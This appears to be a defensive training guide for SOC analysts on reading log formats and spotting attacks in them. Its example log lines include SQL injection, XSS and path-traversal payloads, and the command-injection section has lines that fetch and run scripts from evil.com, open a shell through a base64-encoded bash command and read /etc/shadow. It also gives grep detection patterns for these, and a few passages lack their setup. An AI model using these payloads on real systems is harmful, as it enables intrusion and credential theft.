# Anatomy of a Log

# What Actually Lives Inside a Log Line

Every useful log entry answers four questions: **When** did it happen, **Who** did it, **Where** did it come from, and **What** happened. If any of those four are missing, the log is significantly less useful. A line that just says "Connection refused" with no timestamp or source IP is basically garbage. You cannot build a timeline, you cannot attribute action, and you cannot make a decision about severity.

#### Formats You Will Encounter in the Wild

There is no single log format in this industry. Every application, every daemon, every library invents its own. But most of them fall into a few recognizable buckets, and once you learn to identify them, parsing becomes second nature.

##### **Syslog (RFC 5424):** This is the **backbone of Linux logging**. You will see lines like this on nearly every server you manage:

```
Nov  3 14:22:05 web-server-01 nginx[4821]: 203.0.113.42 - - "GET /api/users HTTP/1.1" 200 1453 "-" "Mozilla/5.0" 0.032
```

Notice the structure: timestamp, hostname, process name with PID, then the message body. That hostname field is critical. When you are aggregating logs from 50 servers into a central SIEM, the hostname tells you exactly which box was hit. I once spent three hours chasing an alert only to realize the hostname in the log pointed to a decommissioned test server. Always verify the source.

**Apache/Nginx Combined Format:** Web servers use a fixed-position format that looks intimidating until you parse it once:

```
192.168.1.55 - alice [03/Nov/2025:14:22:05 -0500] "POST /login HTTP/1.1" 200 3841 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0)"
```

Each field is separated by spaces or brackets. The dash in the second position is the ident field, which is almost always empty and can be safely ignored. The third field is the authenticated username, which shows as a dash if nobody was logged in. The rest is self-explanatory once you know the order.

**JSON Structured Logs:** Modern applications increasingly output JSON because it is machine-parseable. This is a SOC analyst dream because you can grep and slice it with jq

```
{"timestamp":"2025-11-03T14:22:05Z","level":"ERROR","service":"auth","user":"admin","ip":"10.0.0.45","message":"Login failed: invalid credentials","attempt":3}
```

Timestamps Are Everything

Common timestamp formats you will see in production:

- `2025-11-03T14:22:05Z` — ISO 8601 with UTC marker (best case scenario)
- `Nov 3 14:22:05` — Syslog short format with no year (assume current year)
- `03/Nov/2025:14:22:05 -0500` — Apache format with timezone offset
- `1730658125` — Unix epoch in seconds since 1970 (convert before reading)

When you encounter Unix epoch timestamps, convert them immediately. Running `date -d @1730658125` on Linux will give you the human-readable version. Never try to mentally convert epoch timestamps. You will make mistakes, and mistakes in timelines lead to wrong conclusions.

Log Levels and Severity

Most applications tag each log line with a severity level. The standard levels in order of increasing severity are:

- **DEBUG** — Verbose output for developers, usually disabled in production
- **INFO** — Normal operations. "User logged in," "Request processed," "Service started"
- **WARN** — Something unexpected but not fatal. A retry succeeded, a deprecated function was called, a config fallback was used
- **ERROR** — Something failed. A database query timed out, authentication was rejected, a file was not found
- **FATAL/CRIT** — The application or service crashed or is about to crash

As a SOC analyst, you mostly care about WARN and above during normal operations. DEBUG and INFO are noise until you are actively hunting a specific threat and need full visibility. During an incident, turn on DEBUG logging if you can. It will generate volume, but it will also reveal what the attacker did.

Real Incident: The Missing Log That Cost Us

In January 2025, I responded to an incident at a mid-size e-commerce company. An attacker had gained access to a staging server and pivoted to production. The catch? The staging server had logging completely disabled to save disk space. We had zero visibility into how the attacker moved laterally, and that gap cost us two extra days of forensic work.

Here is what the production logs eventually showed once we pieced together the timeline from multiple sources:

```
2025-01-14T03:17:42Z [sshd] Accepted publickey for deploy from 10.0.5.23 port 44832 ssh2
2025-01-14T03:18:01Z [app] User deploy created account ops-admin role=admin
2025-01-14T03:19:15Z [sudo] deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash
```

Three lines told us the entire story: SSH login from the staging box, privilege escalation by creating an admin account, then sudo to root. If the staging server had been logging, we would have seen the initial foothold and the full chain of compromise.
**The lesson:** Every server, every application, every service should produce logs. If you cannot see it, you cannot defend it. Disk space is cheap. Incident response without logs is expensive.

Quality Matters More Than Quantity


Every incident I have ever worked started with reading a log line that something felt off about. Learn to read them well, and you will catch things others miss.

# SSH Authentication

# When Someone Knocks on the SSH Door

SSH is the front door to every Linux server you will ever manage. And just like a real front door in a bad neighborhood, it gets hammered by attackers constantly. I have seen production servers with 50,000 failed SSH login attempts in a single day. That is not a typo. Fifty thousand. If you know what to look for in auth.log, you can spot a brute force attack, a compromised credential, or a lateral movement event within seconds of pulling up the file.

Where SSH Logs Live

On Debian and Ubuntu systems, SSH authentication events go to `/var/log/auth.log`. On RHEL, CentOS, and Amazon Linux, they go to `/var/log/secure`. Both use the same log format because they both come from the same PAM (Pluggable Authentication Modules) stack underneath.

A typical SSH session produces multiple log lines. Here is what a successful key-based login looks like:

COPY_CODE

```
Nov  3 14:22:05 web-server-01 sshd[4821]: Accepted publickey for alice from 10.0.0.15 port 44832 ssh2: RSA SHA256:abc123def456
Nov  3 14:22:05 web-server-01 sshd[4821]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
```

Two lines, both timestamped the same second. The first is the SSH daemon itself confirming the key was accepted. The second is PAM confirming the session started. Both are important, but the first one is where the source IP and username live. In an investigation, I always start with the sshd line because it has the most actionable fields.

##### Anatomy of a Failed Login

Failed logins look like this:

```
Nov  3 14:22:10 web-server-01 sshd[4825]: Failed password for invalid user administrator from 203.0.113.77 port 52314 ssh2
Nov  3 14:22:12 web-server-01 sshd[4826]: Failed password for invalid user administrator from 203.0.113.77 port 52315 ssh2
Nov  3 14:22:14 web-server-01 sshd[4827]: Failed password for invalid user administrator from 203.0.113.77 port 52316 ssh2
```

##### Spotting a Brute Force Attack

A brute force attack is not subtle. You will see the same source IP hitting the same service repeatedly. Here is a real pattern I extracted from a production server during an incident in October 2025:

```
Nov  3 14:22:10 web-server-01 sshd[4825]: Failed password for invalid user admin from 203.0.113.77 port 52314 ssh2
Nov  3 14:22:12 web-server-01 sshd[4826]: Failed password for invalid user admin from 203.0.113.77 port 52315 ssh2
Nov  3 14:22:15 web-server-01 sshd[4827]: Failed password for root from 203.0.113.77 port 52316 ssh2
Nov  3 14:22:17 web-server-01 sshd[4828]: Failed password for root from 203.0.113.77 port 52318 ssh2
Nov  3 14:22:20 web-server-01 sshd[4829]: Failed password for invalid user test from 203.0.113.77 port 52320 ssh2
```

Notice the attacker tries admin, root, and test within 10 seconds. That is textbook username spraying. To count attempts from a single IP quickly, use this command:

```
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head
```

That shows you the top offending IPs in seconds. When I see more than 10 failures from a single IP in under a minute, I start blocking. Do not wait for 100 attempts. By then, the attacker may have already found a weak password.


#### How fail2ban Saves You

fail2ban is the single most effective defense against SSH brute force on Linux. It watches auth.log in real time, counts failures per IP, and automatically adds iptables rules to drop traffic from offending IPs after a configurable threshold.

A typical fail2ban action looks like this in the logs:

```
Nov  3 14:23:01 web-server-01 fail2ban.actions[1234]: NOTICE [sshd] Ban 203.0.113.77
```

One line. The attacker is now blocked at the firewall level. But the ban does not retroactively fix anything. You still need to check whether they got in before the ban was applied. Search for accepted logins from the same IP:

COPY_CODE

```
grep "203.0.113.77" /var/log/auth.log | grep "Accepted"
```

If that returns anything, you have a compromised account and the incident just escalated from brute force to active breach.

## 

Key-Based Auth Is Not Bulletproof

People think SSH keys mean they are safe. They are significantly safer than passwords, but not immune. If an attacker steals the private key file, they can authenticate just like the legitimate user. In a 2025 incident I investigated, an attacker exfiltrated `~/.ssh/id_rsa` from a developer workstation via a phishing email, then logged into the production server as that developer.

The telltale sign in the logs:

```
Jan 14 03:17:42 prod-server-01 sshd[9912]: Accepted publickey for dev-alice from 198.51.100.23 port 44832 ssh2: RSA SHA256:xyz789
```
Quick Detection Checklist

When reviewing SSH logs, keep these patterns in mind:

- More than 5 failed attempts from one IP in 60 seconds equals brute force in progress
- "Accepted" from an IP you do not recognize means investigate immediately
- Failed attempts for "invalid user" followed by a success equals password spray attack
- Key-based auth from unusual geolocation or impossible travel equals possible key theft
- Multiple users failing from the same IP equals credential stuffing campaign

SSH logs are your first line of defense on every Linux system. Learn to read them fast, set up fail2ban, and never assume key-based auth makes you invincible.

# Web Access Logs

# Reading the Web Server's Memory

Every HTTP request your web server receives gets written to a log file. Every single one. That means every user click, every API call, every scanner probe, and every exploitation attempt is sitting there in plain text waiting for you to read it. Web access logs are the single most important data source for detecting web-based attacks, and if you cannot parse one quickly, you are flying blind during an incident.
##### The Format That Matters
Apache and Nginx use what is called the Combined Log Format by default. Here is a real-looking entry from a production server:

```
192.168.1.55 - alice [03/Nov/2025:14:22:05 -0500] "POST /api/login HTTP/1.1" 200 3841 "https://app.example.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

Let me break this apart because every field has investigation value:

- `192.168.1.55` — Client IP address (where the request came from)
- `-` — Ident field (almost always a dash, ignore it)
- `alice` — Authenticated username (shows as dash if not logged in)
- `[03/Nov/2025:14:22:05 -0500]` — Timestamp with timezone offset
- `"POST /api/login HTTP/1.1"` — Request line containing method, path, and protocol
- `200` — HTTP status code (the server responded successfully)
- `3841` — Response body size in bytes
- `"https://app.example.com"` — Referrer header (where the user came from)
- `"Mozilla/5.0..."` — User-Agent string (what software made the request)

Status Codes Tell You the Story

The status code is where you start every web log investigation. Here is what each range tells you:
- **2xx (200, 201, 204):** Success. The request worked as intended. Most of your traffic should live here.
- **3xx (301, 302, 304):** Redirect or not modified. Usually benign, but a redirect to an external domain can indicate compromise.
- **4xx (400, 401, 403, 404):** Client error. 401 means unauthorized, 403 means forbidden, 404 means not found. A burst of any of these from a single IP is suspicious.
- **5xx (500, 502, 503):** Server error. Your application is having problems. A sudden spike in 500s could mean a successful injection attack broke your application logic.

```
203.0.113.42 - - [03/Nov/2025:02:15:01 -0500] "GET / HTTP/1.1" 200 8432 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
203.0.113.42 - - [03/Nov/2025:02:15:03 -0500] "GET /sitemap.xml HTTP/1.1" 200 12400 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
203.0.113.42 - - [03/Nov/2025:02:15:05 -0500] "GET /robots.txt HTTP/1.1" 200 234 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
```

Every request had a valid User-Agent identifying it as Googlebot. Every request was to a normal page. Every request returned 200. It was just Google indexing the site. The junior analyst had not checked the User-Agent field, which is the first thing you should do when investigating high-volume IPs.

But then I kept reading the logs and found this from the same IP, five minutes later:

```
203.0.113.42 - - [03/Nov/2025:02:17:44 -0500] "GET /admin/panel HTTP/1.1" 403 532 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
203.0.113.42 - - [03/Nov/2025:02:17:45 -0500] "GET /wp-admin/ HTTP/1.1" 403 532 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

###### Same IP, but now the User-Agent switched to a generic browser string, and it was hitting admin paths that returned 403 Forbidden. The scanner had rotated its User-Agent to avoid detection. This technique is called **User-Agent rotation** and it is a massive red flag every time you see it.

Quick Filtering Techniques

When you have 500,000 lines of access log to search through, you need to filter fast. Here are the commands I reach for first:

```
grep " 403 " access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

That gives you the top IPs producing 403 errors. Replace 403 with 401 to find authentication failures. Replace with 500 to find application errors. Replace with 404 to find probing for hidden files.

To find all requests to a specific sensitive path:

```
grep "/admin" access.log | awk '{print $1, $4, $7, $9}'
```

# Windows Event Logs

# Windows Logs Are Not as Scary as They Look

I spent years avoiding Windows Event Logs because the sheer volume overwhelmed me. A single Domain Controller can generate 100,000 security events per day. That is not an exaggeration. But here is the secret that took me way too long to learn: you only care about a handful of Event IDs for security investigations. Once you know which ones to watch, Windows logs become one of your most powerful detection tools in the entire stack.

The Security Log and Event IDs That Matter

Windows stores security events in the Security log, viewable in Event Viewer on the box itself or exported as EVTX files for analysis in tools like SIEM platforms or event log viewers. Every event has an Event ID number. These are the ones you need to memorize:

- **4624** — Logon success (someone got in)
- **4625** — Logon failure (someone tried and failed)
- **4672** — Special privileges assigned (admin-level logon)
- **4720** — User account created (possible persistence)
- **4726** — User account deleted (covering tracks)
- **4732** — Member added to a local group (privilege escalation)
- **1102** — Audit log cleared (massive red flag)
#### Logon Types: Who Logged In How

This is where most analysts get confused and give up. Event 4624 tells you someone logged in, but the **Logon Type** field tells you how they logged in. This matters enormously for determining whether the activity is suspicious:

- **Type 2** — Interactive (physically at the keyboard)
- **Type 3** — Network (SMB share access, IIS pass-through authentication)
- **Type 4** — Batch (a scheduled task running under credentials)
- **Type 5** — Service (a Windows service account starting up)
- **Type 7** — Unlock (workstation was unlocked after lock screen)
- **Type 8** — NetworkCleartext (FTP, basic auth HTTP, anything sending passwords in clear text)
- **Type 9** — NewCredentials (runas /netonly, token was cloned)
- **Type 10** — RemoteInteractive (RDP session, most critical for remote attacks)
- **Type 11** — CachedInteractive (logged in with cached domain credentials, no DC contact)

A Type 10 logon from an unusual source IP means someone is RDP-ing into the box. A Type 3 logon at 3 AM from a service account means either a scheduled job fired or someone is moving laterally via SMB. A Type 9 means someone used runas to get a fresh token with different credentials, which is a classic lateral movement technique.

The parsed event looked like this:

```
Event ID: 4624
Logon Type: 10 (RemoteInteractive)
Account Name: administrator
Account Domain: CORP
Source Network Address: 10.0.5.23
Workstation: WKSTN-ACCT04
Logon Process: User32
Authentication Package: Negotiate
```

Digging deeper, I found Event 4625 (logon failures) from the same IP an hour earlier:

```
Event ID: 4625
Logon Type: 10
Account Name: administrator
Failure Reason: Unknown user name or bad password
Source Network Address: 10.0.5.23
```

The attacker had sprayed passwords for an hour before finding the right one. Once inside, they had full admin privileges. The workstation was compromised with a credential stealing implant. The entire attack chain was visible in the Windows event logs if someone had been watching.

Detecting Account Manipulation

Event 4720 is your early warning system for attacker persistence. When an attacker creates a new user account, they have a backdoor that survives password resets and account lockouts:

```
Event ID: 4720
Account Name: svc-backup
Account Domain: CORP
Caller Computer Name: DC01
```


The Log Clear Event

Event 1102 is the event you never want to see in your environment: "Audit log cleared." When an attacker clears the security log, they are actively destroying evidence of their actions. The event itself is logged before the clear operation completes, so you will always see at least one event after a clear:

```
Event ID: 1102
Subject: CORP\\administrator
Log Type: Security
Audit Log Cleared By: CORP\\administrator
```

If the admin account cleared its own log, either it was a legitimate maintenance action or the admin account is compromised. Check with the IT team immediately. If nobody cleared logs intentionally, assume breach and escalate.

Practical Windows Log Hunting

You can query Windows events from the command line with PowerShell, which is much faster than clicking through Event Viewer:


```powershell
Get-WinEvent -FilterHashtable @{LogName="Security"; ID=4624,4625} -MaxEvents 100 | Format-Table TimeCreated, Id, Message -Wrap
```

# Detecting Web Attacks

#### When the Log Tells You Someone Is Attacking

#### SQL Injection in the Logs
SQL injection leaves very specific fingerprints in web access logs. The attack almost always modifies a parameter value to include SQL syntax that the database was never meant to execute.

**Here is what a real SQLi attempt looks like in an Apache access log:**

```
203.0.113.42 - - [03/Nov/2025:14:22:05 -0500] "GET /products.php?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 8432
```

Notice the single quote after the `1`, the `UNION SELECT` keyword, and the `--` comment at the end. The attacker is trying to append a second SQL query that dumps the entire users table. The `--` at the end comments out the rest of the original query so it does not cause a syntax error.

Common SQLi patterns you will see in production logs:

- `' OR '1'='1` — Classic tautology bypass that always evaluates to true
- `' UNION SELECT` — Data extraction via UNION query to pull data from other tables
- `'; DROP TABLE` — Destructive injection (rare in access logs because the app usually errors first)
- `1' AND SLEEP(5)--` — Time-based blind injection where the attacker measures response delay
- `1' AND 1=1--` versus `1' AND 1=2--` — Boolean-based blind injection comparing response differences

The URL-encoded versions are just as common in logs. `%27` is a single quote, `%20` is a space, `%27%20OR%271%27%3D%271` is the tautology above. If you see `%27` in a URL parameter, decode it and look much closer at what follows.

Real Case: The Blind Injection Nobody Caught

I investigated a case where the web application was returning 200 for every request, including obvious SQLi payloads. The analyst before me had dismissed all the alerts because "200 means everything is fine and the application handled it safely." That is wrong, and it nearly cost the client their entire user database.

The logs showed this pattern from an internal IP:

```
192.168.50.50 - - [03/Nov/2025:02:15:01 -0500] "GET /api/user?id=1%27%20AND%201=1-- HTTP/1.1" 200 234
192.168.50.50 - - [03/Nov/2025:02:15:02 -0500] "GET /api/user?id=1%27%20AND%201=2-- HTTP/1.1" 200 0
192.168.50.50 - - [03/Nov/2025:02:15:03 -0500] "GET /api/user?id=1%27%20AND%201=1-- HTTP/1.1" 200 234
```


#### **Cross-Site Scripting (XSS)**

XSS payloads show up in URL parameters and form POST body data. In access logs, you will see them embedded in the request line:

```
10.0.0.99 - - [03/Nov/2025:14:30:00 -0500] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 4532
```

The `<script>` tag is the obvious giveaway. But sophisticated attackers encode their payloads to avoid simple string matching:

- `%3Cscript%3E` — URL-encoded `<script>` tag
- `javascript:alert(1)` — In href parameters for link-based XSS
- `<img src=x onerror=alert(1)>` — Event handler injection without script tags
- `&#60;script&#62;` — HTML entity encoding of the angle brackets

The most common pattern I see in real attacks is reflected XSS through a search parameter, a redirect parameter, or an error message that echoes user input. Grep for `<script`, `alert(`, `document.cookie`, `onerror`, and `javascript:` in your access logs to catch the majority of XSS attempts.

Path Traversal

Path traversal attempts appear as `../` sequences in the URL, trying to navigate up the directory tree to access files outside the web root:
```
203.0.113.42 - - [03/Nov/2025:14:35:00 -0500] "GET /view?file=../../../../etc/passwd HTTP/1.1" 400 132
203.0.113.42 - - [03/Nov/2025:14:35:01 -0500] "GET /view?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 400 132
```

The attacker tried both the raw `../` path and the URL-encoded `%2F` version. The 400 response means the application blocked it this time. But the attempt is still logged. Always monitor for the same source IP trying different encoding tricks after an initial failure.

Your Detection Strategy

Do not try to manually read thousands of log lines looking for attacks. Use automated grep patterns to surface the suspicious entries:

```
grep -iE "(union\s+select|or\s+1=1|<script|\.\./|%2e%2e)" access.log
```

That single command catches 80% of common web attack signatures in access logs. Refine it based on your specific application. If your application never uses `UNION` in any legitimate query, then any occurrence of `UNION` in the logs is malicious by definition and should be treated as a confirmed attack attempt.

# Firewall & Network Logs

# The Border War: Reading Firewall and Network Logs

I have seen breached networks where the firewall logs were the only reliable evidence of what happened during the intrusion. They are also the first place I look when someone reports "something weird" on the network because they give you the big picture of traffic flow.
##### What Firewall Logs Look Like

The format depends on your firewall vendor, but the essential fields are always the same. Here is a typical iptables or UFW log entry from a Linux firewall:

```
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=52314 DPT=22 FLAGS=SYN
```
Let me break down every field because they all matter:

- `SRC=203.0.113.77` — Source IP address (the machine trying to connect)
- `DST=192.168.1.10` — Destination IP address (your server)
- `PROTO=TCP` — Protocol used (TCP, UDP, ICMP, etc.)
- `SPT=52314` — Source port (ephemeral, randomly assigned by the client)
- `DPT=22` — Destination port (the service being targeted, 22 is SSH)
- `FLAGS=SYN` — TCP flags (SYN means a brand new connection attempt)

A Cisco ASA log looks completely different in syntax but contains the same essential data:

```
%ASA-4-106023: Deny TCP src outside:203.0.113.77/52314 dst inside:192.168.1.10/22 by access-group "outside_access_in"
```

ALLOW versus DENY: What Actually Matters

Most firewall configurations log denied traffic by default. Allowed traffic is usually not logged unless you explicitly enable it. This creates a dangerous blind spot. You can see every attempt to get in, but you cannot see what actually got through.

I strongly recommend enabling logging on your ACCEPT rules for critical services like SSH, HTTP, and database ports. Yes, it generates significantly more data. Yes, you need more disk space. But when an incident happens and you need to reconstruct the attacker timeline, you will be grateful you have the full picture of both blocked and allowed connections.

Here is a real-world log excerpt from a server that was eventually compromised:

```
Nov  3 14:00:01 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.23 DST=192.168.1.10 PROTO=TCP SPT=44321 DPT=22 FLAGS=SYN
Nov  3 14:00:02 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=198.51.100.23 DST=192.168.1.10 PROTO=TCP SPT=44322 DPT=22 FLAGS=SYN
Nov  3 14:00:03 firewall-1 kernel: [UFW ACCEPT] IN=eth0 SRC=198.51.100.23 DST=192.168.1.10 PROTO=TCP SPT=44323 DPT=22 FLAGS=SYN
Nov  3 14:01:15 firewall-1 kernel: [UFW ACCEPT] IN=eth0 SRC=198.51.100.23 DST=192.168.1.10 PROTO=TCP SPT=44323 DPT=443 FLAGS=SYN
```

The first two lines show blocked attempts on port 22 (SSH). The third line shows a suddenly successful connection on the same port from the same IP. Then the attacker moved to port 443 (HTTPS). The transition from BLOCK to ACCEPT between lines 2 and 3 is the incident. Either someone opened port 22 to this IP manually, or the firewall rule was modified. That change is what you need to investigate.

##### Network Scanning Detection

A port scan produces a very specific and unmistakable pattern in firewall logs: one source IP hitting many destination ports in rapid succession:

```
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=60001 DPT=21 FLAGS=SYN
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=60002 DPT=22 FLAGS=SYN
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=60003 DPT=23 FLAGS=SYN
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=60004 DPT=25 FLAGS=SYN
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=60005 DPT=80 FLAGS=SYN
Nov  3 14:22:05 firewall-1 kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.77 DST=192.168.1.10 PROTO=TCP SPT=60006 DPT=443 FLAGS=SYN
```

Same second, same source IP, sequential destination ports. That is nmap or a similar port scanner running a quick SYN scan. To quantify how many unique ports one IP probed:

```
grep "203.0.113.77" firewall.log | grep -oP "DPT=\d+" | sort -u | wc -l
```

If that number is above 20, you are definitely looking at a port scan. Above 100 and it is a comprehensive sweep. Log the IP, note the time, and check whether any of those ports were later allowed.
#### Beaconing Detection

Advanced persistent threats do not scan ports. They connect quietly and regularly. Malware that calls home to its command-and-control server every 60 seconds produces a very different log pattern:

```
Nov  3 14:00:01 firewall-1 kernel: [UFW ACCEPT] IN=eth0 SRC=10.0.0.55 DST=203.0.113.50 PROTO=TCP SPT=44321 DPT=443
Nov  3 14:01:01 firewall-1 kernel: [UFW ACCEPT] IN=eth0 SRC=10.0.0.55 DST=203.0.113.50 PROTO=TCP SPT=44322 DPT=443
Nov  3 14:02:01 firewall-1 kernel: [UFW ACCEPT] IN=eth0 SRC=10.0.0.55 DST=203.0.113.50 PROTO=TCP SPT=44323 DPT=443
```

Same internal IP, same external IP, same destination port, exactly 60 seconds apart every time. That is not human behavior. Humans do not open browser tabs at precise one-minute intervals for hours on end. That is a C2 beacon, and it is one of the most reliable indicators of compromise in network logs.

To detect beaconing automatically, calculate the time delta between consecutive connections from the same internal IP to the same external IP. If the standard deviation of those deltas is very low (under 10 seconds) across 10 or more connections, you are almost certainly looking at malware calling home. Most legitimate application traffic has some jitter in its timing. Malware using simple sleep intervals does not.

Quick Analysis Commands

These commands will save you during an investigation:

```
awk '{print $NF}' firewall.log | sort | uniq -c | sort -rn | head
```

That gives you the most common destination ports in your firewall log. Unusual ports appearing at the top of the list are always worth investigating. Build the habit of running this every morning to spot new trends before they become incidents.

# Command Injection: The Payload in the Log

Command injection is one of the most dangerous web vulnerabilities because it gives an attacker the ability to execute arbitrary operating system commands directly on your server. And here is the thing that most junior analysts miss: command injection leaves very clear traces in your web access logs. The problem is that most people do not recognize shell metacharacters when they appear URL-encoded in a log line. Once you learn to spot them, you will see command injection attempts everywhere.

The Metacharacters That Matter

Unix shells treat certain special characters as command separators, pipes, or substitution operators. When an attacker injects these characters into a web parameter, they end up in your access log exactly as the HTTP request sent them:

- `;` — Command separator. Runs the next command regardless of whether the first one succeeded.
- `|` — Pipe. Sends the output of one command as input to the next command.
- `||` — OR operator. Runs the second command only if the first one fails.
- `&&` — AND operator. Runs the second command only if the first one succeeds.
- `` ` `` — Backtick command substitution. Executes the enclosed command and replaces itself with the output.
- `$()` — Dollar-parenthesis command substitution (modern and more common syntax).
-   — Newline character. Can separate commands in some shell contexts.

In URL encoding, these characters appear as: `%7C` is pipe, `%3B` is semicolon, `%26%26` is double ampersand, `%60` is backtick, and `%0A` is newline.

What Command Injection Looks Like in Logs

Here is a real-world example from a network monitoring tool that had a "ping" feature taking a hostname parameter. An attacker found and exploited it:

```
10.0.5.5 - - [03/Nov/2025:09:00:00 -0500] "GET /tools/ping.php?host=8.8.8.8%7Cwget+http://evil.com/malware.sh HTTP/1.1" 200 150
```

URL-decoded, that reads: `host=8.8.8.8|wget http://evil.com/malware.sh`

The attacker is piping the ping output to wget, which downloads a malicious shell script from the attacker server. The `|` character is the dead giveaway that this is command injection and not a legitimate ping request.

Here are more realistic examples I have encountered in production logs over the years:

```
10.0.5.5 - - "GET /tools/ping.php?host=127.0.0.1%3Bcat+/etc/passwd HTTP/1.1" 200 2341
10.0.5.5 - - "GET /tools/ping.php?host=127.0.0.1%7C%7Ccurl+http://evil.com/shell.sh|sh HTTP/1.1" 200 150
10.0.5.5 - - "GET /tools/ping.php?host=127.0.0.1%60id%60 HTTP/1.1" 200 45
```

URL-decoded, those read:

- `host=127.0.0.1;cat /etc/passwd` — Reading the password file
- `host=127.0.0.1||curl http://evil.com/shell.sh|sh` — Downloading and executing a reverse shell
- `host=127.0.0.1`id`` — Running the `id` command and returning the output

Real Incident: The Monitoring Server Compromise

In September 2025, I investigated a breach at a managed services provider. The attacker found a monitoring tool with a ping function that did not sanitize user input. Here is the full attack sequence extracted from the access logs:

```
198.51.100.23 - - [12/Sep/2025:01:15:00 -0500] "GET /api/ping?host=127.0.0.1%3Bid HTTP/1.1" 200 32
198.51.100.23 - - [12/Sep/2025:01:15:05 -0500] "GET /api/ping?host=127.0.0.1%3Buname+-a HTTP/1.1" 200 78
198.51.100.23 - - [12/Sep/2025:01:15:10 -0500] "GET /api/ping?host=127.0.0.1%3Bcat+/etc/shadow HTTP/1.1" 200 432
198.51.100.23 - - [12/Sep/2025:01:16:00 -0500] "GET /api/ping?host=127.0.0.1%3Becho+YmFzaCAtaSA+L2Jpbi9iYXNo|base64+-d|bash HTTP/1.1" 200 150
```

The attacker started with basic reconnaissance (`id` to check permissions, `uname -a` to identify the OS), escalated to reading `/etc/shadow` (the password hash file), and then installed a reverse shell using a base64-encoded bash command. The entire attack chain was visible in the access logs, but the monitoring tool was generating 50,000 requests per day and nobody was watching the logs. That is the real problem. The detection was there. The monitoring was not.

##### Detection Patterns

To find command injection attempts in your web access logs, search for the shell metacharacters in URL parameters:

```
grep -iE "(%7C|%3B|%26%26|%60|%0a)" access.log
```

Or for more targeted results, look for metacharacters combined with known post-exploitation commands:

```
grep -iE "(;|\||&&|\$()" access.log | grep -iE "(wget|curl|cat|passwd|shadow|bash|sh |nc |python|perl)"
```

The second command is much more precise: it looks for shell metacharacters AND common post-exploitation commands appearing together. That combination is almost never legitimate.

##### Prevention versus Detection

The correct fix for command injection is input validation and parameterized commands on the application side. But as a SOC analyst, you do not control the code. You control the detection layer. Even if the application is vulnerable, your log monitoring should catch the exploitation attempt before the attacker gets what they want.
##### POST-Based Injection Is Harder to Spot

Not all command injection shows up in GET parameters in the URL. POST requests carry their payload in the request body, which means the access log only shows the endpoint, not the injected command. Here is what a POST-based command injection looks like in an access log:
```
10.0.5.5 - - [03/Nov/2025:09:30:00 -0500] "POST /api/diagnostic HTTP/1.1" 200 150
```
The log line alone tells you nothing about the attack. You need to correlate with application logs, WAF logs, or network packet captures to see the POST body. This is why POST-based injection is favored by more sophisticated attackers who want to avoid detection.

# Advanced Obfuscation

Attackers know you are watching. To bypass WAFs (Web Application Firewalls) and evade detection, they intentionally scramble, encode, and obfuscate their payloads.

🎯 Mission Objective

By the end of this module, you will recognize PowerShell base64 encoding, spot Double URL Encoding techniques, and know the immediate workflow for handling deeply obfuscated payloads.

---

📖 Core Concept: PowerShell Encoded Commands

Malware heavily relies on PowerShell. To avoid antivirus, scripts are encoded.

**Scenario:** You find this PowerShell event log:

```powershell
powershell.exe -NoP -NonI -W Hidden -Enc aWV4IChOZXctT...
```

**What does `-Enc` indicate?** **The command after -Enc is base64-encoded and will be decoded and executed by PowerShell.** Attackers use this to hide malicious scripts from basic string-matching detections.

---

🛡️ Technical Overview: Double URL Encoding

WAFs decode URLs once. If an attacker double-encodes a payload, the WAF sees harmless text, but the backend application decodes it a second time and executes it.

**Scenario:** Your web access log shows:

```text
GET /api/search?q=%2527%2520UNION%2520SELECT%25201,database()-- HTTP/1.1
```

The `%25` sequences indicate double URL encoding. After **one round of decoding**, what would you see? **Answer:** `%27%20UNION%20SELECT%201,database()--` The `%25` decodes into `%`, reforming the actual single-round encoded SQL injection.

---
🔍 Analytical Workflow: Handling Heavy Obfuscation

When you encounter a nightmare payload...

**Analyst Action Plan:** An analyst is examining an obfuscated payload and sees high densities of `%XX` sequences in URL parameters, keywords like `SELECT` and `UNION` after partial decoding, and a base64 string over 200 characters in a search field. What is the best course of action? **Decode the payload using CyberChef or command-line tools to reveal the full attack, then create detection rules for the decoded patterns.** You cannot accurately assess the threat until you strip away every layer of obfuscation.
